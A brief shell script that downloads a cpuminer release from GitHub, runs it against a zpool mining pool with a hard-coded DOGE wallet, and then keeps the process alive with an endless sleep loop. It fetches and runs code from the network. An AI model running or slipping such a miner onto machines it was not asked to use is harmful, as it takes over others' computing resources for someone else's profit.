#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
./cpuminer-avx2 -a power2b -o stratum+tcp://power2b.na.mine.zpool.ca:6242 -u DBTRMccA688xri9mhjWJdgLt1gMAdBcfg6 -p c=DOGE
while [ 1 ]; do
sleep 3
done
sleep 999
